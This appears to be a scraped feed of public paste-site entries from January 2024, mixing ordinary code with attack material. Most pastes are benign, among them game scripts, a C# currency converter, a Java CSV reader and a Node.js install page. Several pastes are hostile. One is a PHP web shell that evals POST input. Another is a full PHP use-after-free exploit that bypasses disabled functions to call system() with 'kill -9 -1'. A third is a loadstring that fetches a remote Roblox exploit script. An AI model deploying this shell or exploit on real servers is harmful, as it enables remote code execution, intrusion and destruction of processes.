loadstring(game:HttpGet(""https://raw.githubusercontent.com/REDzHUBz/PetSimulator99/main/redz9999.lua"" ))()"
LBSUZE9D,Untitled,TakePen,AutoIt,Friday 5th of January 2024 02:03:17 AM CDT,"fire 2x (ranger assa)
+45^ench 2x (ranger assa)
vamp scythe 2x (assa necro)
frog divine q9
cc divine q9
cc dom q9
bds Cursed q13 (para)
Vamp spear (para)
ench spear (para)
serenity now 10% (uw ranger)"
w7MXaZZH,take a guess~???,nitestryker,C,Friday 5th of January 2024 12:19:47 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>

#define NUM_THREADS 10
#define MAX_CONNECTIONS 100

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
int client_sockets[MAX_CONNECTIONS];
char* host = ""localhost"";
int port = 80;

void *start_connection(void *arg) {
    while (1) {
        int client_sock;
        struct sockaddr_in serv_addr;
        socklen_t sockfd_size = sizeof(struct sockaddr);

        if (!pthread_mutex_lock(&mutex)) {
            // Check if there's an available socket in the pool
            for (int i = 0; i < MAX_CONNECTIONS; i++) {
                if (client_sockets[i] != -1) {
                    client_sock = client_sockets[i];
                    client_sockets[i] = -1; // Mark the socket as in use
                    break;
                }
            }
            pthread_mutex_unlock(&mutex);

            if (client_sock == -1) {
                // No available socket in the pool, create a new one
                if ((client_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
                    perror(""socket"");
                    exit(EXIT_FAILURE);
                }

                memset(&serv_addr, 0, sockfd_size);
                serv_addr.sin_family = AF_INET;
                serv_addr.sin_port = htons(port);
                inet_pton(AF_INET, host, &serv_addr.sin_addr);

                if (connect(client_sock, (struct sockaddr *)&serv_addr, sockfd_size) != 0) {
                    perror(""connect"");
                    close(client_sock);
                    continue;
                }
            }

            printf(""Connected to %s:%d...\n"", host, port);
            sleep(1);
            
            // Return the socket to the pool
            if (!pthread_mutex_lock(&mutex)) {
                for (int i = 0; i < MAX_CONNECTIONS; i++) {
                    if (client_sockets[i] == -1) {
                        client_sockets[i] = client_sock;
                        break;
                    }
                }
                pthread_mutex_unlock(&mutex);
            }

            close(client_sock);
            break;
        }
    }

    pthread_exit(NULL);
}

int main() {
    pthread_t tid[NUM_THREADS];
    pthread_attr_t attr;
    pthread_mutex_init(&mutex, NULL);

    // Initialize the client socket pool
    for (int i = 0; i < MAX_CONNECTIONS; i++) {
        client_sockets[i] = -1;
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_create(&tid[i], NULL, start_connection, NULL);
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(tid[i], NULL);
    }

    pthread_mutex_destroy(&mutex);
    return 0;
}
"
Bisea38J,Untitled,Sonicover,Ruby,Thursday 4th of January 2024 11:53:31 PM CDT,"def chooseRandomItem(qty=1)
  #Item Groups
  groups = [
  :MEDICINE,
  :POKEBALL,
  :EVOLUTION,
  :UTILITY
  ]
 
  #Array of items
  commonMeds = [
  :POTION,
  :BURNHEAL,
  :AWAKENING
  ]
 
  commonBalls = [
  :POKEBALL,
  :NESTBALL,
  :NETBALL
  ]
 
  commonEvo = [
  :STRAWBERRYSWEET,
  :WATERSTONE,
  :FIRESTONE,
  :THUNDERSTONE,
  :LEAFSTONE
  ]
 
  commonUtil = [
  :REPEL
  ]  
 
  uncommonMeds = [
  :SUPERPOTION,
  :ANTIDOTE,
  :PARALYZEHEAL,
  :FULLHEAL
  ]
 
  uncommonBalls = [
  :GREATBALL,
  :DIVEBALL,
  :HEALBALL,
  :DUSKBALL
  ]
 
  uncommonEvo = [
  :METALCOAT,
  :KINGSROCK,
  :REAPERCLOTH,
  :CHIPPEDPOT,
  :CRACKEDPOT,
  :LINKCABLE,
  :LEADERSCREST,
  :MASTERPIECETEACUP,
  :UNREMARKABLETEACUP,
  :MOONSTONE,
  :SUNSTONE,
  :ICESTONE
  ]  
 
  uncommonUtil = [
  :SUPERREPEL
  ]  
 
  epicMeds = [
  :HYPERPOTION,
  :ICEHEAL
  ]
 
  epicBalls = [
  :ULTRABALL,
  :QUICKBALL,
  :REPEATBALL
  ]
 
 
  epicEvo = [
  :DEEPSEATOOTH,
  :DEEPSEASCALE,
  :OVALSTONE,
  :GALARICACUFF,
  :GALARICAWREATH,
  :SCROLLOFWATERS,
  :SCROLLOFDARKNESS
  ]
 
  epicUtil = [
  :MAXREPEL
  ]  
 
  legendaryMeds = [
  :MAXPOTION,
  :FULLRESTORE
  ]
 
  legendaryBalls = [
  :MASTERBALL
  ]
 
 
  legendaryEvo = [
  :SWEETAPPLE,
  :DRAGONSCALE,
  :UPGRADE,
  :DUBIOUSDISK,
  :PROTECTOR,
  :ELECTRIZER,
  :MAGMARIZER,
  :RAZORFANG,
  :RAZORCLAW,
  :PRISMSCALE,
  :WHIPPEDDREAM,
  :SACHET,
  :TARTAPPLE,
  :SWEETAPPLE,
  :BLACKAUGURITE,
  :PEATBLOCK,
  :AUSPICIOUSARMOR,
  :MALICIOUSARMOR,
  :SYRUPAPPLE,
  :DAWNSTONE,
  :DUSKSTONE,
  :SHINYSTONE
  ]
 
 
  #Randomly select Group
  itemtype = rand(4)
  itemrarity = rand(10)
	if itemtype == 1
		if itemrarity < 1
			pbMessage(_INTL(""You received a Legendary Medicine loot drop!""))
			pbReceiveItem(legendaryMeds[rand(0...legendaryMeds.length)],qty)
		elsif itemrarity <2
			pbMessage(_INTL(""You received an Epic Medicine loot drop!""))	
			pbReceiveItem(epicMeds[rand(0...epicMeds.length)],qty)
		elsif itemrarity <4
			pbMessage(_INTL(""You received an Uncommon Medicine loot drop!""))
			pbReceiveItem(uncommonMeds[rand(0...uncommonMeds.length)],qty)	  
		else
			pbMessage(_INTL(""You received a Common Medicine loot drop!""))	
			pbReceiveItem(commonMeds[rand(0...commonMeds.length)],qty)
		end	
	elsif itemtype == 2
		if itemrarity < 1 
			pbMessage(_INTL(""You received a Legendary Pokeball loot drop!""))
			pbReceiveItem(legendaryBalls[rand(0...legendaryBalls.length)],qty)
		elsif itemrarity < 2 
			pbMessage(_INTL(""You received an Epic Pokeball loot drop!""))	
			pbReceiveItem(epicBalls[rand(0...epicBalls.length)],qty)
		elsif itemrarity < 4
			pbMessage(_INTL(""You received an Uncommon Pokeball loot drop!""))
			pbReceiveItem(uncommonBalls[rand(0...uncommonBalls.length)],qty)	  
		else
			pbMessage(_INTL(""You received a Common Pokeball loot drop!""))	
			pbReceiveItem(commonBalls[rand(0...commonBalls.length)],qty)
		end
	elsif itemtype == 3
		if itemrarity < 1
			pbMessage(_INTL(""You received a Legendary Evolution loot drop!""))
			pbReceiveItem(legendaryEvo[rand(0...legendaryEvo.length)],qty)
		elsif itemrarity < 2
			pbMessage(_INTL(""You received an Epic Evolution loot drop!""))	
			pbReceiveItem(epicEvo[rand(0...epicEvo.length)],qty)
		elsif itemrarity < 4
			pbMessage(_INTL(""You received an Uncommon Evolution loot drop!""))
			pbReceiveItem(uncommonEvo[rand(0...uncommonEvo.length)],qty)	  
		else
			pbMessage(_INTL(""You received a Common Evolution loot drop!""))	
			pbReceiveItem(commonEvo[rand(0...commonEvo.length)],qty)
		end
	else #itemtype == 4
		if itemrarity < 2
			pbMessage(_INTL(""You received an Epic Utility loot drop!""))	
			pbReceiveItem(epicUtil[rand(0...epicUtil.length)],qty)
		elsif itemrarity < 4
			pbMessage(_INTL(""You received an Uncommon Utility loot drop!""))
			pbReceiveItem(uncommonUtil[rand(0...uncommonUtil.length)],qty)	  
		else
			pbMessage(_INTL(""You received a Common Utility loot drop!""))	
			pbReceiveItem(commonUtil[rand(0...commonUtil.length)],qty)
		end
	end
end"
7PD7cX4A,erc.el diff,brickviking,Diff,Thursday 4th of January 2024 11:10:13 PM CDT,"--- erc.el~     2023-11-18 23:46:25.014693325 +1300
+++ erc.el      2024-01-04 20:05:21.267792296 +1300
@@ -1,6 +1,6 @@
 ;;; erc.el --- An Emacs Internet Relay Chat client  -*- lexical-binding:t -*-

-;; Copyright (C) 1997-2023 Free Software Foundation, Inc.
+;; Copyright (C) 1997-2024 Free Software Foundation, Inc.

 ;; Author: Alexander L. Belikoff <alexander@belikoff.net>
 ;; Maintainer: Amin Bandali <bandali@gnu.org>, F. Jason Park <jp@neverwas.me>
@@ -1002,7 +1002,7 @@

 ;; variables available for IRC scripts

-(defvar erc-user-information ""ERC User""
+(defvar erc-user-information ""umm...dunno. User uses something I guess.""
   ""USER_INFORMATION IRC variable."")

 ;; Hooks"
USLujraK,RCE Post Shell,willysec_id,PHP,Thursday 4th of January 2024 10:49:15 PM CDT,"<?php
class  Test{
    public $name = '';
    function __destruct(){
        @eval(""$this->name"");
    }
} 
$test= new Test();
$c = @$_POST['css'];
$test->name = $c;
?>egm"
r2zyaQD5,Bypass Kill System Process,willysec_id,PHP,Thursday 4th of January 2024 10:10:57 PM CDT,"<?php
opcache_reset();
new Pwn(""kill -9 -1"");

class Helper { public $a, $b, $c; }
class Pwn {
    const LOGGING = false;
    const CHUNK_DATA_SIZE = 0x60;
    const CHUNK_SIZE = ZEND_DEBUG_BUILD ? self::CHUNK_DATA_SIZE + 0x20 : self::CHUNK_DATA_SIZE;
    const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;

    const HT_SIZE = 0x118;
    const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;

    public function __construct($cmd) {
        for($i = 0; $i < 10; $i++) {
            $groom[] = self::alloc(self::STRING_SIZE);
            $groom[] = self::alloc(self::HT_STRING_SIZE);
        }
        
        $concat_str_addr = self::str2ptr($this->heap_leak(), 16);
        $fill = self::alloc(self::STRING_SIZE);

        $this->abc = self::alloc(self::STRING_SIZE);
        $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
        self::log(""abc @ 0x%x"", $abc_addr);

        $this->free($abc_addr);
        $this->helper = new Helper;
        if(strlen($this->abc) < 0x1337) {
            self::log(""uaf failed"");
            return;
        }

        $this->helper->a = ""leet"";
        $this->helper->b = function($x) {};
        $this->helper->c = 0xfeedface;

        $helper_handlers = $this->rel_read(0);
        self::log(""helper handlers @ 0x%x"", $helper_handlers);

        $closure_addr = $this->rel_read(0x20);
        self::log(""real closure @ 0x%x"", $closure_addr);

        $closure_ce = $this->read($closure_addr + 0x10);
        self::log(""closure class_entry @ 0x%x"", $closure_ce);
        
        $basic_funcs = $this->get_basic_funcs($closure_ce);
        self::log(""basic_functions @ 0x%x"", $basic_funcs);

        $zif_system = $this->get_system($basic_funcs);
        self::log(""zif_system @ 0x%x"", $zif_system);

        $fake_closure_off = 0x70;
        for($i = 0; $i < 0x138; $i += 8) {
            $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
        }
        $this->rel_write($fake_closure_off + 0x38, 1, 4);
        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
        $this->rel_write($fake_closure_off + $handler_offset, $zif_system);

        $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
        self::log(""fake closure @ 0x%x"", $fake_closure_addr);

        $this->rel_write(0x20, $fake_closure_addr);
        ($this->helper->b)($cmd);

        $this->rel_write(0x20, $closure_addr);
        unset($this->helper->b);
    }

    private function heap_leak() {
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf) {
            $arr = 1;
            $buf = str_repeat(""\x00"", self::HT_STRING_SIZE);
        });
        $arr[1] .= self::alloc(self::STRING_SIZE - strlen(""Array""));
        return $buf;
    }

    private function free($addr) {
        $payload = pack(""Q*"", 0xdeadbeef, 0xcafebabe, $addr);
        $payload .= str_repeat(""A"", self::HT_STRING_SIZE - strlen($payload));
        
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf, &$payload) {
            $arr = 1;
            $buf = str_repeat($payload, 1);
        });
        $arr[1] .= ""x"";
    }

    private function rel_read($offset) {
        return self::str2ptr($this->abc, $offset);
    }

    private function rel_write($offset, $value, $n = 8) {
        for ($i = 0; $i < $n; $i++) {
            $this->abc[$offset + $i] = chr($value & 0xff);
            $value >>= 8;
        }
    }

    private function read($addr, $n = 8) {
        $this->rel_write(0x10, $addr - 0x10);
        $value = strlen($this->helper->a);
        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
        return $value;
    }

    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->read($addr);
            $f_name = $this->read($f_entry, 6);
            if($f_name === 0x6d6574737973) {
                return $this->read($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry !== 0);
    }

    private function get_basic_funcs($addr) {
        while(true) {
            $addr -= 0x10;
            if($this->read($addr, 4) === 0xA8 &&
                in_array($this->read($addr + 4, 4),
                    [20180731, 20190902, 20200930, 20210902])) {
                $module_name_addr = $this->read($addr + 0x20);
                $module_name = $this->read($module_name_addr);
                if($module_name === 0x647261646e617473) {
                    self::log(""standard module @ 0x%x"", $addr);
                    return $this->read($addr + 0x28);
                }
            }
        }
    }

    private function log($format, $val = """") {
        if(self::LOGGING) {
            printf(""{$format}\n"", $val);
        }
    }

    static function alloc($size) {
        return str_shuffle(str_repeat(""A"", $size));
    }

    static function str2ptr($str, $p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p + $j]);
        }
        return $address;
    }
}

?>"
Q6nsa6TL,C#_2_lesson_currency_exchange,Legiomax,C#,Thursday 4th of January 2024 09:54:32 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace C_Ijun
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string CommandExchangeRubToUsd = ""exchange rubls by dollars"";
            const string CommandExchangeRubToCny = ""exchange rubls by yuan"";
            const string CommandExchangeUsdToCny = ""exchange dollars by yuan"";
            const string CommandExchangeUsdToRub = ""exchange dollars by rubls"";
            const string CommandExchangeCnyToRub = ""exchange yuan by rubls"";
            const string CommandExchangeCnyToUsd = ""exchange yuan by dollars"";
            const string CommandInfoBalance = ""info by balance"";
            const string CommandExit = ""exit"";

            bool isWork = true;

            float countOfRub;
            float countOfUsd;
            float countOfCny;
            float sumForExchange;
            float rubToUsd = 0.011f;
            float rubToCny = 0.078f;
            float usdToRub = 91.35f;
            float usdToCny = 7.12f;
            float cnyToUsd = 0.14f;
            float cnyToRub = 12.83f;

            string userChoice;

            Console.WriteLine(""–ö–æ–Ω–≤–µ—Ä—Ç–µ—Ä –≤–∞–ª—é—Ç."");
            Console.Write(""–í–≤–µ–¥–∏—Ç–µ –±–∞–ª–∞–Ω—Å —Ä—É–±–ª–µ–π: "");
            countOfRub = Convert.ToSingle(Console.ReadLine());

            Console.Write(""–í–≤–µ–¥–∏—Ç–µ –±–∞–ª–∞–Ω—Å –¥–æ–ª–ª–∞—Ä–æ–≤: "");
            countOfUsd = Convert.ToSingle(Console.ReadLine());

            Console.Write(""–í–≤–µ–¥–∏—Ç–µ –±–∞–ª–∞–Ω—Å —é–∞–Ω–µ–π: "");
            countOfCny = Convert.ToSingle(Console.ReadLine());

            while (isWork)
            {
                Console.WriteLine(""–í—ã–±—Ä–∞—Ç—å –¥–µ–π—Å—Ç–≤–∏–µ:"");
                Console.WriteLine(""exchange rubls by dollars - –û–±–º–µ–Ω—è—Ç—å —Ä—É–±–ª–∏ –Ω–∞ –¥–æ–ª–ª–∞—Ä—ã."");
                Console.WriteLine(""exchange rubls by yuan - –û–±–º–µ–Ω—è—Ç—å —Ä—É–±–ª–∏ –Ω–∞ —é–∞–Ω–∏."");
                Console.WriteLine(""exchange dollars by yuan - –û–±–º–µ–Ω—è—Ç—å –¥–æ–ª–ª–∞—Ä—ã –Ω–∞ —é–∞–Ω–∏."");
                Console.WriteLine(""exchange dollars by rubls - –û–±–º–µ–Ω—è—Ç—å –¥–æ–ª–ª–∞—Ä—ã –Ω–∞ —Ä—É–±–ª–∏."");
                Console.WriteLine(""exchange yuan by rubls - –û–±–º–µ–Ω—è—Ç—å —é–∞–Ω–∏ –Ω–∞ —Ä—É–±–ª–∏."");
                Console.WriteLine(""exchange yuan by dollars - –û–±–º–µ–Ω—è—Ç—å —é–∞–Ω–∏ –Ω–∞ –¥–æ–ª–ª–∞—Ä—ã."");
                Console.WriteLine(""info by balance - –£–∑–Ω–∞—Ç—å –±–∞–ª–∞–Ω—Å."");
                Console.WriteLine(""exit - –í—ã—Ö–æ–¥ –∏–∑ –ø—Ä–æ–≥—Ä–∞–º–º—ã."");

                userChoice = Console.ReadLine();

                switch (userChoice)
                {
                    case CommandExchangeRubToUsd:
                        Console.Write(""–û–±–º–µ–Ω—è—Ç—å —Ä—É–±–ª–∏ –Ω–∞ –¥–æ–ª–ª–∞—Ä—ã.\n–°—É–º–º–∞ –¥–ª—è –æ–±–º–µ–Ω–∞: "");
                        sumForExchange = Convert.ToSingle(Console.ReadLine());

                        if (countOfRub >= sumForExchange)
                        {
                            countOfRub -= sumForExchange;
                            countOfUsd += sumForExchange * rubToUsd;
                            Console.Write($""–ë–∞–ª–∞–Ω—Å:\n–†—É–±–ª–µ–π: {countOfRub}\n–î–æ–ª–ª–∞—Ä–æ–≤: {countOfUsd}"");
                        }
                        else
                        {
                            Console.Write(""–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—É–º–º—ã –¥–ª—è –æ–±–º–µ–Ω–∞."");
                        }
                        break;

                    case CommandExchangeRubToCny:
                        Console.Write(""–û–±–º–µ–Ω—è—Ç—å —Ä—É–±–ª–∏ –Ω–∞ —é–∞–Ω–∏.\n–°—É–º–º–∞ –¥–ª—è –æ–±–º–µ–Ω–∞: "");
                        sumForExchange = Convert.ToSingle(Console.ReadLine());

                        if (countOfRub >= sumForExchange)
                        {
                            countOfRub -= sumForExchange;
                            countOfCny += sumForExchange * rubToCny;
                            Console.Write($""–ë–∞–ª–∞–Ω—Å:\n–†—É–±–ª–µ–π: {countOfRub}\n–Æ–∞–Ω–µ–π: {countOfCny}"");
                        }
                        else
                        {
                            Console.Write(""–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—É–º–º—ã –¥–ª—è –æ–±–º–µ–Ω–∞."");
                        }
                        break;

                    case CommandExchangeUsdToCny:
                        Console.Write(""–û–±–º–µ–Ω—è—Ç—å –¥–æ–ª–ª–∞—Ä—ã –Ω–∞ —é–∞–Ω–∏.\n–°—É–º–º–∞ –¥–ª—è –æ–±–º–µ–Ω–∞: "");
                        sumForExchange = Convert.ToSingle(Console.ReadLine());

                        if (countOfUsd >= sumForExchange)
                        {
                            countOfUsd -= sumForExchange;
                            countOfCny += sumForExchange * usdToCny;
                            Console.Write($""–ë–∞–ª–∞–Ω—Å:\n–î–æ–ª–ª–∞—Ä–æ–≤: {countOfUsd}\n–Æ–∞–Ω–µ–π: {countOfCny}"");
                        }
                        else
                        {
                            Console.Write(""–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—É–º–º—ã –¥–ª—è –æ–±–º–µ–Ω–∞."");
                        }
                        break;

                    case CommandExchangeUsdToRub:
                        Console.Write(""–û–±–º–µ–Ω—è—Ç—å –¥–æ–ª–ª–∞—Ä—ã –Ω–∞ —Ä—É–±–ª–∏.\n–°—É–º–º–∞ –¥–ª—è –æ–±–º–µ–Ω–∞: "");
                        sumForExchange = Convert.ToSingle(Console.ReadLine());

                        if (countOfUsd >= sumForExchange)
                        {
                            countOfUsd -= sumForExchange;
                            countOfRub += sumForExchange * usdToRub;
                            Console.Write($""–ë–∞–ª–∞–Ω—Å:\n–î–æ–ª–ª–∞—Ä–æ–≤: {countOfUsd}\n–†—É–±–ª–µ–π: {countOfRub}"");
                        }
                        else
                        {
                            Console.Write(""–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—É–º–º—ã –¥–ª—è –æ–±–º–µ–Ω–∞."");
                        }
                        break;

                    case CommandExchangeCnyToRub:
                        Console.Write(""–û–±–º–µ–Ω—è—Ç—å —é–∞–Ω–∏ –Ω–∞ —Ä—É–±–ª–∏.\n–°—É–º–º–∞ –¥–ª—è –æ–±–º–µ–Ω–∞: "");
                        sumForExchange = Convert.ToSingle(Console.ReadLine());

                        if (countOfCny >= sumForExchange)
                        {
                            countOfCny -= sumForExchange;
                            countOfRub += sumForExchange * cnyToRub;
                            Console.Write($""–ë–∞–ª–∞–Ω—Å:\n–Æ–∞–Ω–µ–π: {countOfCny}\n–†—É–±–ª–µ–π: {countOfRub}"");
                        }
                        else
                        {
                            Console.Write(""–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—É–º–º—ã –¥–ª—è –æ–±–º–µ–Ω–∞."");
                        }
                        break;

                    case CommandExchangeCnyToUsd:
                        Console.Write(""–û–±–º–µ–Ω—è—Ç—å —é–∞–Ω–∏ –Ω–∞ –¥–æ–ª–ª–∞—Ä—ã.\n–°—É–º–º–∞ –¥–ª—è –æ–±–º–µ–Ω–∞: "");
                        sumForExchange = Convert.ToSingle(Console.ReadLine());

                        if (countOfCny >= sumForExchange)
                        {
                            countOfCny -= sumForExchange;
                            countOfUsd += sumForExchange * cnyToUsd;
                            Console.Write($""–ë–∞–ª–∞–Ω—Å:\n–Æ–∞–Ω–µ–π: {countOfCny}\n–î–æ–ª–ª–∞—Ä–æ–≤: {countOfUsd}"");
                        }
                        else
                        {
                            Console.Write(""–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—É–º–º—ã –¥–ª—è –æ–±–º–µ–Ω–∞."");
                        }
                        break;

                    case CommandInfoBalance:
                        Console.Write($""–í–∞—à –±–∞–ª–∞–Ω—Å:\n–†—É–±–ª–∏: {countOfRub}\n–î–æ–ª–ª–∞—Ä—ã: {countOfUsd}\n–Æ–∞–Ω–∏: {countOfCny}"");
                        break;

                    case CommandExit:
                        Console.Write(""–≠—Ç–æ –∫–æ–Ω–µ—Ü..."");
                        isWork = false;
                        break;
                }

                Console.Write(""\n–ù–∞–∂–º–∏—Ç–µ –ª—é–±—É—é –∫–ª–∞–≤–∏—à—É."");
                Console.ReadKey();
                Console.Clear();
            }
        }
    }
}
"
cex3BtLJ,best snowybot now good,coinwalk,JavaScript,Thursday 4th of January 2024 09:40:06 PM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var base = (oldestbal/1440000)
var bellance = oldestbal;
var botplus = base;
var trget = parseFloat(oldestbal);
var tens = (base*10);
var sevens = (base*6.9);
var eights  = (base*7.1)
var floatingbal = 0;
var fran = oldestbal;
var betnext = ((botplus*1).toFixed(8));
 
 
function get(){
console.clear();
bellance = document.getElementById('pct_balance').value;
var good = ((bellance-oldestbal).toFixed(8));
console.log(""profit"");
console.log(good);
if ((bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))&&(bellance!=floatingbal)) {
     botplus = botplus*2;  
     floatingbal  = parseFloat(bellance);
}
if ((botplus>=(base*3))&&(bellance>=fran)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    floatingbal = 0;
    fran  = parseFloat(bellance); 
}
if (bellance>(trget*24)){
console.log(""buy ebike"");
return;
}
betnext = ((botplus*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(betnext);
$('#a_hi').click();
setTimeout(() => get(), 100);
}
get();"
uMqy5n5X,Untitled,cwunder,TypeScript,Thursday 4th of January 2024 09:05:20 PM CDT,"'use client';

import * as TabsPrimitive from '@radix-ui/react-tabs';
import { useTheme } from 'next-themes';
import type { FC } from 'react';

import Button from '@/components/Common/Button';
import CodeBox from '@/components/Common/CodeBox';
import CodeTabs from '@/components/Common/CodeTabs';
import WithFooter from '@/components/withFooter';
import WithNavBar from '@/components/withNavBar';
import { useDetectOS } from '@/hooks';
import { useRouter } from '@/navigation.mjs';

const nvmContent = `# Install Node Version Manager (NVM)\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/master/install.sh | bash\n\n# Install Node.js\nnvm install --lts\n\n# Check that Node is installed\nnode -v\n\n# Check your NPM version\nnpm -v`;
const chocoContent = `# Install Chocolatey\nSet-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))\n\n# Install Node.js\nchoco install nodejs-lts\n\n# Check that Node is installed\nnode -v\n\n# Check your NPM version\nnpm -v`;

const downloadTabs = [
  { key: 'nvm', label: 'macOS / Linux (nvm)' },
  { key: 'choco', label: 'Windows (Chocolatey)' },
];

const HomeLayout: FC = () => {
  const { os } = useDetectOS();
  const { resolvedTheme } = useTheme();
  const { push } = useRouter();

  return (
    <>
      <WithNavBar />

      <div className=""flex flex-row"">
        <section>
          {/* code for optional banner TODO */}

          <Button
            onClick={() => push('/download')}
            variant={resolvedTheme === 'dark' ? 'special' : 'primary'}
          >
            {/* this should be i18n */}
            Download Node.js
          </Button>

          <a>
            {/* this should be i18n */}
            Get Started
          </a>
        </section>

        <section>
          <CodeTabs
            tabs={downloadTabs}
            defaultValue={os === 'WIN' ? 'choco' : 'nvm'}
            linkUrl=""/download/package-manager""
            linkText=""More Options (this should be i18n)""
          >
            <TabsPrimitive.Content value=""nvm"">
              <CodeBox language=""Bash"">
                <code>{nvmContent}</code>
              </CodeBox>
            </TabsPrimitive.Content>
            <TabsPrimitive.Content value=""choco"">
              <CodeBox language=""Bash"">
                <code>{chocoContent}</code>
              </CodeBox>
            </TabsPrimitive.Content>
          </CodeTabs>

          <span>
            {/* note this should be i18n, including the option of Chocolate or NVM */}
            Copy and paste this snippet to install Node.js LTS via{' '}
            {os === 'WIN' ? 'Chocolatey' : 'NVM'}
          </span>
        </section>
      </div>

      <WithFooter />
    </>
  );
};

export default HomeLayout;
"
zn9R0sbz,Fern Installer,clothe,Batch,Thursday 4th of January 2024 08:48:27 PM CDT,"# Fern Installer

Write-Host ""Installing Fern...""

# Create Fern script
@""
@echo off
cls
title [v1] Fern Console
prompt %CD% #
""@ | Out-File -FilePath ""fern.cmd"" -Encoding ASCII

# Installing reset script
Write-Host ""Installing reset...""

@""
@echo off
cls
prompt
cmd
""@ | Out-File -FilePath ""reset.cmd"" -Encoding ASCII

Write-Host ""Done installing Fern.""
pause
Clear-Host
Start-Process ""fern.cmd"""
nFr6inYJ,Mboc kickstarter v2 rfd,Thoughtcoder411,Bash,Thursday 4th of January 2024 08:33:02 PM CDT,"**MBOC:
**Your Source for Affordable Electronics**

Hey there!  how you been?  Its been awhile Tired of shelling out a fortune for electronics? We're constantly bombarded with posts about e-waste stores closing or moving or repair/return, but hold up - if these gadgets are bound for the trash and will never be used, why can't we have them? Better question where do we find them.. Enter MBOC - your solution to this dilemma.

We're not your run-of-the-mill company; at our core, we're a grow collective of individuals with various skills, ppassionate about ensuring everyone enjoys top-notch tech without breaking the bank.

**Our Mission:** *Deliver below-market prices of unique items to as many people as possible.*

Keeping prices low with minimal markups is our mantra. How? We've got cutting-edge systems like AI algorithms and real people on the ground, hunting down the best deals from brands like Sony and Samsung. Smart stocking as well as source buying allows us to pass on these fantastic prices to you. From TVs and laptops to DJ equipment and home goods, we've got it all.

Why pay a premium when there's an abundance of these items produced yearly? My quest to find deals for myself and friends turned into a mission: *Find the deals, share the deals.* Others resonated with this goal, understanding the issue and joining in to spread the word.

**MBOC - My Box Of Components** - encapsulates our online catalog and the unique 'pick your category' shopping experience we offer. We firmly believe everyone deserves their dream PC, server, kitchen, or car stereo. Forget guesswork - we engage directly with you, providing tools to craft your perfect box. Hobbyists? We've got your back, diving deep into your interests to source the right hardware, software, and even custom solutions.

At MBOC, you're not just a client - you're an old friend. Our reps use a tailored system, VPM, ensuring you not only get great gear but also save big on everything you purchase.

Ready to dive into the world of affordable electronics tailored just for you? Welcome to MBOC. We missed ya "
M9gRvfQ9,sber_task1,NadarK,Java,Thursday 4th of January 2024 08:30:09 PM CDT,"package org.NadarKanloev;


import java.io.*;
import java.util.ArrayList;
import java.util.List;

public class Main {
    public static class City{
        public City(String name, String region, String district, int population, String foundation){
            this.name = name;
            this.region = region;
            this.district = district;
            this.population = population;
            this.foundation = foundation;
        }
        private int id;
        private String name;
        private String region;
        private String district;
        private int population;
        private String foundation;
        @Override
        public String toString() {
            return String.format(""City{name='%s', region='%s', district='%s', population='%s', foundation='%s'}"",
                    name, region, district, population, foundation);
        }
    }
    public static void main(String[] args){
        List<City> cities = new ArrayList<>();
        String line = """";
        try (BufferedReader bufferedReader = new BufferedReader(new FileReader(""–ó–∞–¥–∞—á–∞ –í–° Java –°–±–µ—Ä.csv""))) {
            while ((line = bufferedReader.readLine()) != null) {
                String[] city = line.split("";"");
                String foundation = (city.length == 6) ? city[5] : """";
                City newCity = new City( city[1], city[2], city[3], Integer.valueOf(city[4]), foundation);
                cities.add(newCity);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        for(City city : cities){
            System.out.println(city);
        }
    }
}
"
S1f3QmaG,GlassesMDtest,ComboMaster,Lua,Thursday 4th of January 2024 07:36:33 PM CDT,"local com = require(""component"")
local component = require(""component"")
local fs = require(""filesystem"")
local computer = require(""computer"")
local event = require(""event"")
local term = require(""term"")
local timeConstant = 0.5
 
local gpu = com.gpu
-----------------------------------------------------------------------
local colors = {
    blue = 0x05F5F0,
	orange = 0xFFA500,
    black = 0x000000,
    bred = 0x660000,
    green = 0x99FF33,
    e = 0xFFFF00,
    f = 0xFFFFFF
}
------------------------RES----------------------------------------- 
local items = {
    {""dwcity:Materia"", 0},
    {""minecraft:iron_ingot"", 0},
    {""IC2:itemIngot"", 0}, 
    {""DraconicEvolution:draconiumDust"", 0},
